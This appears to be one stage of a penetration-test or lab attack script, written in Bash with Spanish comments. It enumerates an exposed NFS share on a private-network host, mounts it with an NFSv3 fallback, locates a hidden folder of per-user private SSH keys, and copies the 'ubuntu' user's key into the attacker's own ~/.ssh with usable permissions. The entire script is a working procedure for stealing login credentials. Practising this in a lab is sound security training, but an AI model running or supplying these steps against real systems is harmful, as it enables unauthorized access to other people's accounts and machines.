#!/usr/bin/env bash
# 04_nfs_exfiltracion_clave.sh
#
# Fase 4: montaje del recurso NFS expuesto y localización/extracción
# de la clave privada SSH compartida por error en el share.

TARGET="10.0.2.8"

# Comprobar qué exporta el servidor NFS
showmount -e "$TARGET"
# Export list for 10.0.2.8:
# /mnt/nfs_share *

# Crear el punto de montaje local y montar el recurso (NFSv4 por defecto)
sudo mkdir /mnt/target
sudo mount -t nfs "$TARGET":/mnt/nfs_share /mnt/target

# Alternativa si la versión por defecto (NFSv4) no negocia correctamente:
# fuerza NFSv3 sobre UDP
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3,proto=udp "$TARGET":/mnt/nfs_share /mnt/nfs

# Listado del recurso montado: aparece un directorio .ssh oculto
ls -la /mnt/nfs

# Dentro de .ssh/private_keys hay una carpeta por usuario con su clave
cd /mnt/nfs/.ssh
cd private_keys
ls
cd ubuntu

# Copiamos la clave privada a nuestro propio ~/.ssh y ajustamos permisos
# (SSH exige 600: lectura/escritura solo para el propietario)
cp /mnt/nfs/.ssh/private_keys/ubuntu/sshkey ~/.ssh/id_rsa_ubuntu
chmod 600 ~/.ssh/id_rsa_ubuntu
